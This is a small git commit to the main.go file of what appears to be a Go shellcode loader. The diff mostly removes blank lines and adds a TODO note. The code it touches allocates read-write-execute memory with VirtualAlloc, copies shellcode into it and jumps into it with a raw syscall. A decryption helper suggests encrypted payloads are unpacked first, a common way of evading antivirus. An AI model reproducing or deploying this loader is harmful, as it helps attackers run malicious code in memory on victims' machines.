84ab511516179a073c67fb5f6cef5301483528ff
kaluche <kaluche53@gmail.com>
2019-12-06 10:38:53 +0100

    Update main.go

--- src/main.go
+++ src/main.go
@@ -54,20 +54,16 @@ func decryptthat(encKey string, iv string, cipherText string)(cleartext string){
 
 // Run SC with Syscall
 func SyscallExecute(Shellcode []byte) (bool){
-
-
 	Addr, _, _ := VirtualAlloc.Call(0, uintptr(len(Shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
-
 	AddrPtr := (*[990000]byte)(unsafe.Pointer(Addr))
-
 	for i := 0; i < len(Shellcode); i++ {
 		AddrPtr[i] = Shellcode[i]
 	}
-
 	syscall.Syscall(Addr, 0, 0, 0, 0)
 	return true
 }
 
+// TODO : allow using threadexec
 // func ThreadExecute(Shellcode []byte) {
 // 	Addr, _, _ := VirtualAlloc.Call(0, uintptr(len(Shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
 // 	AddrPtr := (*[990000]byte)(unsafe.Pointer(Addr))
